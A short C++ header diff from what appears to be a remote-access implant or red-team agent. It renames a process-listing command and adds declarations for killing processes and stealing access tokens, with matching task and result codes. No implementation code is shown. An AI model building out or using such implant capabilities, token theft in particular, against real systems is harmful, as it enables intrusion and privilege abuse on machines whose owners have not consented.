@@ -12,6 +12,8 @@
 #define MKDIR_SUCCESS 493
 #define DOWNLOAD_SUCCESS 494
 #define RECONFIG_DONE 495
+#define KILL_SUCCESS 496
+#define STEAL_SUCCESS 497
 
 #define TASK_TYPE_GETPRIVS 3
 #define TASK_TYPE_LS 4
@@ -36,7 +38,7 @@
 
 class commanders {
 	enum CMD_ACTION_CODES {
-		CMD_CODE_PS,
+		CMD_CODE_PROC_LIST,
 		CMD_CODE_CMD,
 		CMD_CODE_CAT,
 		CMD_CODE_LS,
@@ -51,6 +53,8 @@ class commanders {
 		CMD_CODE_UPLOAD,
 		CMD_CODE_DOWNLOAD,
 		CMD_CODE_RECONFIG,
+		CMD_CODE_PROC_KILL,
+		CMD_CODE_STEAL_TOKEN,
 	};
 
 	enum PrivStatus : UINT32 {
@@ -77,10 +81,12 @@ class commanders {
 	void do_cp();
 	void do_rmdir();
 	void do_mkdir();
-	void do_ps();
+	void do_proc_list();
+	void do_proc_kill();
 	void do_upload();
 	void do_download();
 	void do_reconfig();
+	void do_steal_token();
 
 
 public:
